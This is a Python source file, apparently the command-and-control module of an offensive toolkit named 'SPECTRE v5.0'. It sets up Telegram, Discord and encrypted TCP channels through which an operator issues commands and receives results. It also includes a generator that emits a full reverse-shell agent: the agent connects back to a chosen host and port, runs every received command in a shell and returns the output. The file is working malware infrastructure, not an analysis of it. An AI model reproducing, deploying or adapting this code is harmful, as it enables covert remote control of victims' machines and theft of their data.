#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# SPECTRE v5.0 - C2 (Ringkas)
# 👻 AUTHOR: イズミー (IZUMI)

import os
import time
import socket
import threading
from typing import Optional, Dict, List, Callable

from core import cfg, log, C, Utils, Crypto


class TelegramC2:
    name = "telegram"
    def __init__(self, config: dict):
        self.config = config or {}
        self.enabled = self.config.get("enabled", False)
        self.bot_token = self.config.get("bot_token") or os.getenv("SPECTRE_TG_TOKEN", "")
        self.chat_id = str(self.config.get("chat_id") or os.getenv("SPECTRE_TG_CHAT", ""))
        self.base = f"https://api.telegram.org/bot{self.bot_token}" if self.bot_token else ""
        self.last_update_id = 0
        self.poll_interval = self.config.get("poll_interval", 3)
        self._ready = bool(self.bot_token and self.chat_id)
        self._running = False
        self._thread = None
        self._handlers = []

    def is_ready(self):
        return self.enabled and self._ready

    def send(self, message: str) -> bool:
        if not self.is_ready():
            return False
        try:
            import requests
            r = requests.post(f"{self.base}/sendMessage",
                              json={"chat_id": self.chat_id, "text": message[:4000]},
                              timeout=15)
            return r.status_code == 200
        except Exception as e:
            log.error(f"TG: {e}")
            return False

    def poll(self):
        if not self.is_ready():
            return []
        try:
            import requests
            r = requests.get(f"{self.base}/getUpdates",
                             params={"offset": self.last_update_id + 1, "timeout": 5},
                             timeout=15)
            if r.status_code != 200:
                return []
            cmds = []
            for upd in r.json().get("result", []):
                self.last_update_id = max(self.last_update_id, upd.get("update_id", 0))
                msg = upd.get("message", {})
                text = msg.get("text", "").strip()
                if text and str(msg.get("chat", {}).get("id", "")) == self.chat_id:
                    cmds.append(text)
            return cmds
        except Exception:
            return []

    def register_handler(self, fn):
        self._handlers.append(fn)

    def _dispatch(self, cmd):
        for h in self._handlers:
            try:
                out = h(cmd)
                if out is not None:
                    return str(out)
            except Exception:
                pass
        return f"[C2] No handler: {cmd[:50]}"

    def start_listener(self):
        if not self.is_ready() or self._running:
            return
        self._running = True
        def loop():
            log.info("Telegram C2 started")
            self.send("🟢 SPECTRE v5 online")
            while self._running:
                for cmd in self.poll():
                    self.send(f"```\n{self._dispatch(cmd)[:3500]}\n```")
                time.sleep(self.poll_interval)
        self._thread = threading.Thread(target=loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False


class DiscordC2:
    name = "discord"
    def __init__(self, config: dict):
        self.config = config or {}
        self.enabled = self.config.get("enabled", False)
        self.webhook = self.config.get("webhook") or os.getenv("SPECTRE_DISCORD", "")
        self._ready = bool(self.webhook)

    def is_ready(self):
        return self.enabled and self._ready

    def send(self, message: str) -> bool:
        if not self.is_ready():
            return False
        try:
            import requests
            r = requests.post(self.webhook, json={"content": message[:1900]}, timeout=15)
            return r.status_code in (200, 204)
        except Exception:
            return False

    def register_handler(self, fn): pass
    def start_listener(self): pass
    def stop(self): pass


class TcpC2:
    name = "tcp"
    def __init__(self, config: dict):
        self.config = config or {}
        self.enabled = self.config.get("enabled", False)
        self.host = self.config.get("host", "0.0.0.0")
        self.port = self.config.get("port", 4444)
        self.encrypt = self.config.get("encrypt", True)
        ks = self.config.get("key") or Crypto.sha256(b"spectre-v5-c2")[:32]
        self.key = ks.encode() if isinstance(ks, str) else ks
        self._running = False
        self._thread = None
        self.sessions = {}
        self._handlers = []
        self._lock = threading.Lock()

    def is_ready(self):
        return self.enabled

    def register_handler(self, fn):
        self._handlers.append(fn)

    def _dispatch(self, cmd):
        for h in self._handlers:
            try:
                out = h(cmd)
                if out is not None:
                    return str(out)
            except Exception:
                pass
        return f"[C2] No handler"

    def _recv_exact(self, sock, n):
        buf = b""
        while len(buf) < n:
            c = sock.recv(n - len(buf))
            if not c: raise ConnectionError()
            buf += c
        return buf

    def _handle(self, sock, addr):
        sid = f"{addr[0]}:{addr[1]}"
        with self._lock:
            self.sessions[sid] = sock
        log.info(f"TCP C2 client: {sid}")
        try:
            while self._running:
                hdr = self._recv_exact(sock, 4)
                size = int.from_bytes(hdr, "big")
                payload = self._recv_exact(sock, size)
                if self.encrypt:
                    try: payload = Crypto.dec(self.key, payload)
                    except Exception: pass
                cmd = payload.decode(errors="ignore")
                out = self._dispatch(cmd).encode()
                if self.encrypt:
                    try: out = Crypto.enc(self.key, out)
                    except Exception: pass
                sock.sendall(len(out).to_bytes(4, "big") + out)
        except Exception:
            pass
        finally:
            with self._lock:
                self.sessions.pop(sid, None)
            try: sock.close()
            except Exception: pass

    def send(self, message, session_id=None):
        return False

    def start_listener(self):
        if not self.is_ready() or self._running:
            return
        self._running = True
        def loop():
            srv = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            srv.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
            try:
                srv.bind((self.host, self.port))
                srv.listen(20)
                srv.settimeout(2.0)
                log.info(f"TCP C2 on {self.host}:{self.port}")
                while self._running:
                    try:
                        c, a = srv.accept()
                        threading.Thread(target=self._handle, args=(c, a), daemon=True).start()
                    except socket.timeout:
                        continue
            except Exception as e:
                log.error(f"TCP: {e}")
            finally:
                try: srv.close()
                except Exception: pass
        self._thread = threading.Thread(target=loop, daemon=True)
        self._thread.start()

    def stop(self):
        self._running = False


class C2Manager:
    _instance = None
    _lock = threading.Lock()

    def __new__(cls, *a, **kw):
        with cls._lock:
            if cls._instance is None:
                cls._instance = super().__new__(cls)
                cls._instance.channels = {}
                cls._instance._loaded = False
            return cls._instance

    def load(self):
        if self._loaded:
            return
        c2cfg = cfg.get("c2", {}) or {}

        tg = c2cfg.get("telegram", {}) or {}
        if tg.get("enabled"):
            c = TelegramC2(tg)
            if c.is_ready():
                self.channels["telegram"] = c

        dc = c2cfg.get("discord", {}) or {}
        if dc.get("enabled"):
            c = DiscordC2(dc)
            if c.is_ready():
                self.channels["discord"] = c

        tcp = c2cfg.get("custom_tcp", {}) or {}
        if tcp.get("enabled"):
            c = TcpC2(tcp)
            if c.is_ready():
                self.channels["tcp"] = c

        self._loaded = True

    def register_default_handler(self, fn):
        for ch in self.channels.values():
            ch.register_handler(fn)

    def start_all(self):
        self.load()
        for name, ch in self.channels.items():
            try:
                ch.start_listener()
            except Exception as e:
                log.error(f"Start {name}: {e}")

    def stop_all(self):
        for ch in self.channels.values():
            try: ch.stop()
            except Exception: pass

    def broadcast(self, message):
        self.load()
        ok = 0
        for ch in self.channels.values():
            try:
                if ch.send(message): ok += 1
            except Exception: pass
        return ok

    def status(self):
        self.load()
        return {n: c.is_ready() for n, c in self.channels.items()}


_c2 = None
_c2_lock = threading.Lock()


def c2():
    global _c2
    with _c2_lock:
        if _c2 is None:
            _c2 = C2Manager()
        return _c2


class AgentGenerator:
    @staticmethod
    def tcp_agent(host, port, key=""):
        key = key or Crypto.sha256(b"spectre-v5-c2")[:32]
        return f'''#!/usr/bin/env python3
import socket, subprocess, time
from cryptography.fernet import Fernet
HOST="{host}"; PORT={port}; KEY={key!r}

def _recv(s, n):
    b = b""
    while len(b) < n:
        c = s.recv(n - len(b))
        if not c: raise ConnectionError()
        b += c
    return b

def run():
    f = Fernet(KEY)
    while True:
        try:
            s = socket.socket(); s.connect((HOST, PORT))
            while True:
                hdr = _recv(s, 4)
                size = int.from_bytes(hdr, "big")
                payload = f.decrypt(_recv(s, size)).decode()
                try:
                    out = subprocess.check_output(payload, shell=True,
                                                   stderr=subprocess.STDOUT,
                                                   text=True, timeout=60).encode()
                except Exception as e:
                    out = f"Error: {{e}}".encode()
                enc = f.encrypt(out)
                s.sendall(len(enc).to_bytes(4, "big") + enc)
        except Exception:
            time.sleep(10)

if __name__ == "__main__":
    run()
'''


if __name__ == "__main__":
    print(C.a("C2 self-test"))
    mgr = c2()
    mgr.load()
    print(C.i(f"Channels: {mgr.status()}"))
    agent = AgentGenerator.tcp_agent("10.0.0.5", 4444)
    print(C.s(f"TCP agent: {len(agent)} bytes"))
    print(C.h("C2 done 💀"))